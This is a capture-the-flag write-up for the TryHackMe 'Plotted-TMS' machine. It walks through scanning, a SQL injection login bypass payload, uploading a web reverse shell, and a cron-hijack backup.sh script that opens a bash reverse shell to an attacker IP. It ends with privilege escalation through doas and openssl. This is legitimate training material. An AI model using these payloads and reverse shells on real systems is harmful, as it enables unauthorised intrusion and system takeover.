# Plotted-tms | THM
### Difficulty Level: Easy 
-------------------------------------
First, scan the machine with nmap:

```
nmap -p- -T4 -A <machine-ip> -oN plotted.nmap
```

-p- Scan all port instead of the 1000 common ports.

-T4 - Will increase the tempo of the scan.

-A - Aggresive scan

-oN - Save the results into a file.

Results:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 06:49 EDT
Stats: 0:08:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 06:57 (0:00:00 remaining)
Nmap scan report for 10.10.26.6
Host is up (0.10s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/13%OT=22%CT=1%CU=30354%PV=Y%DS=2%DC=T%G=Y%TM=65F1
OS:86D5%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=FD%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=109%TI=Z
OS:%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GC
OS:D=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT1
OS:1NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4
OS:B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   109.01 ms 10.9.0.1
2   110.20 ms 10.10.26.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 557.82 seconds
```

There are 3 open ports: 

22 - SSH

80 - HTTP

445 - HTTP

As known, port 445 generally runs SMB on it, so let's check if there any vulnerability that comes out from this configuration.
So, the nmap scan tells us that the pages that runs on 80 and 445 are apache default pages.

It's the time to use gobuster to scan for any directory that runs on the system.

```
gobuster dir -u http://<machine-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

dir - Tells gobuster to commit directories scan.

-u - append to it the host-address.

-w - append to it the wordlist that you want use.

 
 There are 3 directories:

 /admin with 301 status code.

 /shadow with status code of 200.

 /passwd also with 200 status code.

While browsing into /shadow , there is a text that got the base64 encoded view.


![image](https://cdn-images-1.medium.com/max/1000/1*TAkhiYbEpHLsz62vGdMb3g.png)


Rabbit hole.

Let's browse into /passwd .

There is the same encoded text so it's another rabbit hole.

Let's try to browse into /admin.

![image](https://cdn-images-1.medium.com/max/1000/1*SdAqx2Zg6HSm-PBsN2JP5g.png)

Is it really private key?

```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```

It doesn't look like a key.

As I thought:

![image](https://cdn-images-1.medium.com/max/1000/1*R3RfIwGI9GG5mvuOSbt47w.png)


So I back to gobuster scan, but with a directories that runs on port 445.


![image](https://cdn-images-1.medium.com/max/1000/1*wmBj8JdE3OIcnfgKuCeelQ.png)


There is /management directory.


It looks like a legitimate web page.


![image](https://cdn-images-1.medium.com/max/1000/1*PPRAMElPq2tUZicTXvrXSw.png)


 After a quick testing I found login page:

 ![image](https://cdn-images-1.medium.com/max/1000/1*AYE1p8mrobfaNKZrlyvIQQ.png)


After quick check on google for any default credentials, the first link that appeared was an exploit-db that 
tells about an exploit.
Let's grab the exploit and try it:

![image](https://cdn-images-1.medium.com/max/1000/1*Fxc72LELFs11WPx-AJkAog.png)

I tried it but it doesn't work so I decide to read the script to understand what is all about.
After reading it I saw a payload that relates to sql injection to bypass login page so I tried it manually on
the login page:

![image](https://cdn-images-1.medium.com/max/1000/1*qqLF5ylLJ1Yfs9NRJYCGvg.png)


![image](https://cdn-images-1.medium.com/max/1000/1*wBYEpIln-KAMzpfgO5q-1g.png)

```
admin' or '1'='1'#

this payload is tautology SQLi that inject code which is always true.
So, the data base checks all the usernames within the
db, and this query manipulate the db to use username without any knowledge about it can be.
the "#" sign is used to "cut" the query at the point that is appeard.

the full query looks like:
SELECT * FROM users where username="admin' or '1'='1'# " AND password = "";
 To summ it up:
The db is manipulated by the query to use the first username within it and the part
of the password isn't checked at all by the db cause there is "#" sign that stops
the db from checking if the password is correct or not.
```

We got the administrator dashbord which means we can do anything we want to.

![image](https://cdn-images-1.medium.com/max/1000/1*V9xNOKEPBERpCA6c0BBvaw.png)


So, I thought about getting reverse shell but without any knowledge where to upload it. Hence, I decided to use gobuster again to find any webpages within the system that I have the ability to upload any script to it. Gobuster found /upload directory, which that sounds like a good place to work with.

I'll try to upload it throught the drivers directory by creating a new driver to the system and upload the script there.


![image](https://cdn-images-1.medium.com/max/1000/1*hp0FexFk-BJlt_XUhq1O6A.png)


Let's check if the script was uploaded succesfully:

![image](https://cdn-images-1.medium.com/max/1000/1*WESPFnidiSnvquhLOoGkwg.png)

Yes, it is.

On your machine set netcat listener:

```
nc -lnvp 2222
```

click on the script to run it and there is a shell:

![image](https://cdn-images-1.medium.com/max/1000/1*0x6vEKoU-zJ1kGue6VBimw.png)


and this command will stabilize the shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

Let's find out user.txt flag


![image](https://cdn-images-1.medium.com/max/1000/1*CJG14z24nI7Z-7TLRnRdfg.png)

we need to find a way to be the user that owns the file to read it.

While enumarating the system as www-data i decided to inspect the crontab file for any intersting way to be ploat_admin.

The results:


![image](https://cdn-images-1.medium.com/max/1000/1*yRZbwqu-YtMsggZy2P7n8A.png)


There is a way to that because this user runs the file as scheduald command on the system. Maybe can we modified it
to achive the goal.

we can not modified it, but we have writing permission within the directory so we need to write a new backup.sh script that includes reverse shell payload to get a shell as plot_admin. First, delete the old backup.sh file and create a new one. 

so the new backup.sh includs:

```
#!/bin/bash
/bin/sh -i >& /dev/tcp/<tun-ip>/1234 0>&1

```

After create it on your machine you nedd to upload it to the victim machine with python server:

```
on your machine, open the server with this command inside the directory that includs the backup.sh file:

python3 -m http.server

on victim machine use wget to upload the file into it:

wget http://<your-ip>:8000/backup.sh

```

The next step will be give it execute permission with:

```
chmod +x backup.sh
```


On your machine set netcat listener to achive shell as ploted_admin:

```
nc -lnvp 1234
```

and now wait to file running automatically by the crontab.

there is a shell:

![image](https://cdn-images-1.medium.com/max/1000/1*L89p1gsoQtF6fW9Gl8LnOQ.png)

cat /home/plot_admin/user.txt flag.


***Privilege escalation:*

let's find out if there are any binary that can help us:

```
find / -user root -perm /4000 2>/dev/null
```

![image](https://cdn-images-1.medium.com/max/1000/1*vqnteGcIrwt54GfUy9MfoQ.png)


There is doas binary file that can help us.
Let's read the doas configuration file to understand if is there something helpful.

![image](https://cdn-images-1.medium.com/max/1000/1*de_my2WXS1upQLlGFRzuFQ.png)


We can run openssl as root!

Check what can we do with it on gtfobins:

![image](https://cdn-images-1.medium.com/max/1000/1*Q7q9bjpmQ0CEE1TchPe8eg.png)


It's written there that we can read files as root so try to read root.txt flag.


![image](https://cdn-images-1.medium.com/max/1000/1*hdxWpzXW4ADuivFa97tqTg.png)

root flag has been obtained!

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***







































































 


















